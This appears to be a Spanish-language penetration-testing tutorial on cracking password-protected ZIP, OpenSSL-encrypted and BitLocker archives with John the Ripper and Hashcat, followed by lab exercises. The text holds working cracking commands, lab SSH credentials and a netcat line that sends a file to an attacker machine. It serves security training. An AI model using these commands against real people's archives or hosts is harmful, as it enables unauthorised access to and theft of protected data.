
# Archivos Comprimidos

Además de los archivos independientes, también existe otro formato de archivos que puede contener no sólo datos, como un documento de Office o un PDF, sino también otros archivos dentro de ellos. Este formato se llama `archivo comprimido` y puede protegerse con una contraseña si es necesario.

Supongamos el papel de un empleado en una empresa administrativa e imaginemos que nuestro cliente quiere resumir el análisis en diferentes formatos, como Excel, PDF, Word y la presentación correspondiente. Una solución sería enviar estos archivos individualmente, pero si extendemos este ejemplo a una gran empresa que se ocupa de varios proyectos en ejecución simultáneamente, este tipo de transferencia de archivos puede resultar engorrosa y provocar la pérdida de archivos individuales. En estos casos, los empleados suelen recurrir a archivos, que les permiten dividir todos los archivos necesarios de forma estructurada según los proyectos (a menudo en subcarpetas), resumirlos y empaquetarlos en un solo archivo.

Hay muchos tipos de archivos comprimidos. Algunas extensiones de archivo comunes incluyen, entre otras:

|            |        |             |             |
| ---------- | ------ | ----------- | ----------- |
| `tar`      | `gz`   | `rar`       | `zip`       |
| `vmdb/vmx` | `cpt`  | `truecrypt` | `bitlocker` |
| `kdbx`     | `luks` | `deb`       | `7z`        |
| `pkg`      | `rpm`  | `war`       | `gzip`      |

Puede encontrar una lista extensa de tipos de archivos en [FileInfo.com](https://fileinfo.com/filetypes/compressed) . Sin embargo, en lugar de escribirlos manualmente, también podemos consultarlos usando una sola línea, filtrarlos y guardarlos en un archivo si es necesario. En el momento de escribir este artículo, hay `337`tipos de archivos comprimidos enumerados en fileinfo.com.

**Descargar todas las extensiones de archivos**

```shell-session
afsh4ck@kali$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

.mint
.htmi 
.tpsr
.mpkg  
.arduboy
.ice
.sifz 
.fzpz 
.rar     
.comppkg.hauptwerk.rar
...SNIP...
```

Es importante tener en cuenta que no todos los archivos anteriores admiten la protección con contraseña. A menudo se utilizan otras herramientas para proteger los archivos correspondientes con una contraseña. Por ejemplo, con `tar`, la herramienta `openssl`o `gpg`se utiliza para cifrar los archivos.

***

## <mark style="color:purple;">Cracking de archivos</mark>

Dada la cantidad de archivos diferentes y la combinación de herramientas, mostraremos solo algunas de las formas posibles de descifrar archivos específicos en esta sección. Cuando se trata de archivos protegidos con contraseña, normalmente necesitamos ciertos scripts que nos permitan extraer los hashes de los archivos protegidos y usarlos para descifrar la contraseña de ellos.

El formato `.zip` suele utilizarse mucho en entornos Windows para comprimir muchos archivos en uno solo. El procedimiento que ya hemos visto sigue siendo el mismo excepto que se utiliza un script diferente para extraer los hashes.

***

## <mark style="color:purple;">Cracking de Archivos ZIP</mark>

### **Usando zip2john**

```shell-session
afsh4ck@kali$ zip2john ZIP.zip > zip.hash

ver 2.0 efh 5455 efh 7875 ZIP.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=42, decmplen=30, crc=490E7510
```

Al extraer los hashes, también veremos qué archivos están en el archivo ZIP.

### **Ver el contenido de zip.hash**

```shell-session
afsh4ck@kali$ cat zip.hash 

ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
```

Una vez que hayamos extraído el hash, ahora podemos usar `john` nuevamente para descifrarlo con la lista de contraseñas deseadas. Si `john` lo descifra con éxito, nos mostrará la contraseña correspondiente que podemos usar para abrir el archivo ZIP.

### **Cracking con John**

```shell-session
afsh4ck@kali$ john --wordlist=rockyou.txt zip.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (ZIP.zip/customers.csv)
1g 0:00:00:00 DONE (2022-02-09 09:18) 100.0g/s 250600p/s 250600c/s 250600C/s 123456..1478963
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### **Ver la contraseña en plano**

```shell-session
afsh4ck@kali$ john zip.hash --show

ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip

1 password hash cracked, 0 left
```

***

## <mark style="color:purple;">Cracking de archivos cifrados OpenSSL</mark>

Además, no siempre es evidente si el archivo encontrado está protegido con contraseña, especialmente si se utiliza una extensión de archivo que no admite la protección con contraseña. Como ya hemos comentado, `openssl` se puede utilizar `gzip` para cifrar el archivo como ejemplo. Usando la herramienta `file` podemos obtener información sobre el formato del archivo especificado. Esto podría verse así, por ejemplo:

**Listado de archivos**

```shell-session
afsh4ck@kali$ ls

GZIP.gzip  rockyou.txt
```

**Ver el tipo de formato**

```shell-session
afsh4ck@kali$ file GZIP.gzip 

GZIP.gzip: openssl enc'd data with salted password
```

Al descifrar archivos y archivos cifrados OpenSSL, podemos encontrar muchas dificultades diferentes que traerán muchos falsos positivos o incluso no podremos adivinar la contraseña correcta. Por lo tanto, la opción más segura para tener éxito es utilizar  `openssl` en un `for-loop` que intenta extraer los archivos del archivo directamente si la contraseña se adivina correctamente.

La siguiente línea mostrará muchos errores relacionados con el formato GZIP, que podemos ignorar. Si hemos utilizado la lista de contraseñas correcta, como en este ejemplo, veremos que hemos extraído con éxito otro archivo del archivo.

**Uso de un bucle for para mostrar contenidos extraídos**

```shell-session
afsh4ck@kali$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

<SNIP>
```

Una vez que el bucle for haya finalizado, podemos volver a buscar en la carpeta actual para comprobar si el descifrado del archivo se realizó correctamente.

**Listado del contenido del archivo descifrado**

```shell-session
afsh4ck@kali$ ls

customers.csv  GZIP.gzip  rockyou.txt
```

***

## <mark style="color:purple;">Cracking de unidades cifradas BitLocker</mark>

[BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-device-encryption-overview-windows-10) es un programa de cifrado para particiones enteras y unidades externas. Microsoft lo desarrolló para el sistema operativo Windows. Ha estado disponible desde Windows Vista y utiliza el `AES`algoritmo de cifrado con una longitud de 128 o 256 bits. Si olvidamos la contraseña o PIN de BitLocker, podemos usar la clave de recuperación para descifrar la partición o unidad. La clave de recuperación es una cadena de números de 48 dígitos generada durante la configuración de BitLocker que también puede ser bruteforceada.

A menudo se crean unidades virtuales en las que se almacena información personal, notas y documentos en la computadora o computadora portátil proporcionada por la empresa para evitar el acceso de terceros a esta información. Nuevamente, podemos usar un script llamado `bitlocker2john`para extraer el hash que necesitamos descifrar. Se extraerán [cuatro hashes diferentes](https://openwall.info/wiki/john/OpenCL-BitLocker) , que se pueden usar con diferentes modos hash de Hashcat. Para nuestro ejemplo trabajaremos con la primera, que hace referencia a la contraseña de BitLocker.

### **Usando bitlocker2john**

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ bitlocker2john -i Backup.vhd > backup.hashes
afsh4ck@kali$ grep "bitlocker\$0" backup.hashes > backup.hash
afsh4ck@kali$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b
```

{% endcode %}

Ambos `John`y `Hashcat` pueden usarse para este propósito. Este ejemplo analizará el procedimiento con `Hashcat`. El modo de Hashcat para descifrar hashes de BitLocker es `-m 22100`. Entonces le proporcionamos a Hashcat el archivo con un hash, especificamos nuestra lista de contraseñas y especificamos el modo hash. Dado que se trata de un cifrado robusto ( `AES`), el descifrado puede llevar algún tiempo, dependiendo del hardware utilizado. Además, podemos especificar el nombre del archivo en el que se debe almacenar el resultado.

### **Cracking con Hashcat**

```shell-session
afsh4ck@kali$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

hashcat (v6.1.1) starting...

<SNIP>

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: BitLocker
Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
Time.Started.....: Wed Feb  9 11:46:40 2022 (1 min, 42 secs)
Time.Estimated...: Wed Feb  9 11:48:22 2022 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       28 H/s (8.79ms) @ Accel:32 Loops:4096 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2880/6163 (46.73%)
Rejected.........: 0/2880 (0.00%)
Restore.Point....: 2816/6163 (45.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576
Candidates.#1....: chemical -> secrets

Started: Wed Feb  9 11:46:35 2022
Stopped: Wed Feb  9 11:48:23 2022
```

**Ver el hash crackeado**

```shell-session
afsh4ck@kali$ cat backup.cracked 

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
```

Una vez que hayamos descifrado la contraseña, podremos abrir las unidades cifradas. La forma más sencilla de montar una unidad virtual cifrada con BitLocker es transferirla a un sistema Windows y montarla. Para ello no tenemos más que hacer doble clic en la unidad virtual. Al estar protegido con contraseña, Windows nos mostrará un error. Después del montaje, podemos volver a hacer doble clic en BitLocker para solicitarnos la contraseña.

### **Windows: montaje de BitLocker VHD**

![](https://academy.hackthebox.com/storage/modules/147/bitlocker.png)

***

## <mark style="color:purple;">Caso práctico 1</mark>

> Utiliza la contraseña del usuario Kira, inicie sesión en el host y lea el archivo Notes.zip que contiene la flag. Luego, envía la flag como respuesta.

### Credenciales de acceso por SSH

```
User: kira
Pass: L0vey0u1!
Host: 10.129.219.191
```

### Conexión por SSH

```shell-session
ssh kira@10.129.219.191            
kira@10.129.219.191's password: L0vey0u1!
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Apr 2024 02:08:03 PM UTC

  System load:  0.04               Processes:               180
  Usage of /:   27.8% of 13.72GB   Users logged in:         0
  Memory usage: 30%                IPv4 address for ens192: 10.129.219.191
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

kira@nix01:~$ 
```

Si vamos al directorio Documents encontramos un `Notes.zip`

```shell-session
kira@nix01:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos

kira@nix01:~$ cd Documents
kira@nix01:~/Documents$ ls
Notes.zip
```

### Envío a la máquina de atacante

Vamos a enviarnos este archivo a nuestra máquina de atacante con netcat:

{% code title="En Kali Linux" %}

```bash
nc -nlvp 1234 > Notes.zip         
listening on [any] 1234 ...
```

{% endcode %}

{% code title="En el host" %}

```bash
nc 10.10.14.98 1234 < Notes.zip
```

{% endcode %}

### Zip2john

```shell-session
afsh4ck@kali$ zip2john Notes.zip > zip.hash
ver 1.0 efh 5455 efh 7875 Notes.zip/notes.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=D0CED23B ts=7EF8 cs=7ef8 type=0
```

### Cracking con John

Vamos a utilizar la lista de palabras mutadas que ya hemos visto en secciones anteriores para crackear la contraseña del zip:

```shell-session
john --wordlist=mut_password.list zip.hash 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd3!       (Notes.zip/notes.txt)     
1g 0:00:00:00 DONE (2024-04-18 17:12) 100.0g/s 1005Kp/s 1005Kc/s 1005KC/s ..@shley99!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Con la contraseña `P@ssw0rd3!` vamos a extraer el archivo y obtener la flag:

```shell-session
afsh4ck@kali$ unzip Notes.zip
Archive:  Notes.zip
[Notes.zip] notes.txt password: P@ssw0rd3!
 extracting: notes.txt               

afsh4ck@kali$ cat notes.txt 
HTB{ocnc7r4io8ucsj8eujcm}
```

***

## <mark style="color:purple;">Caso práctico 2</mark>

Vamos a ver un ejemplo de crackeo de un archivo zip protegido con contraseña.

### Paso 1: Crear un archivo ZIP protegido con contraseña

1. Abre una terminal en Kali Linux.
2. Usa el comando `zip` para crear un archivo ZIP con protección por contraseña:

```bash
zip -e archivo_protegido.zip archivo.txt
```

* `-e` activa la encriptación.
* `archivo_protegido.zip` es el nombre del archivo ZIP que se va a crear.
* `archivo.txt` es el archivo que se incluirá en el ZIP.

Al ejecutar este comando, el sistema te pedirá que ingreses y confirmes una contraseña.

### Paso 2: Extraer el hash del archivo ZIP con **zip2john**

Usa el comando `zip2john` para extraer el hash del archivo ZIP protegido:

```bash
zip2john archivo_protegido.zip > hash.zip
```

Esto generará un archivo llamado `hash.zip` que contiene el hash del archivo protegido.

### Paso 3: Crackear el archivo ZIP con **John the Ripper**

Utiliza **John the Ripper** para intentar crackear la contraseña:

```bash
john hash.zip --wordlist=/ruta/a/tu/wordlist.txt
```

* `--wordlist=/ruta/a/tu/wordlist.txt` indica la lista de palabras que se usará para el ataque.
* Puedes usar wordlists preinstaladas en Kali Linux, como `rockyou.txt`, ubicada en `/usr/share/wordlists/rockyou.txt`.

Si la contraseña se encuentra en la lista, **John the Ripper** la mostrará en la salida. Para ver el progreso de cracking, puedes usar:

```bash
john --show hash.zip
```
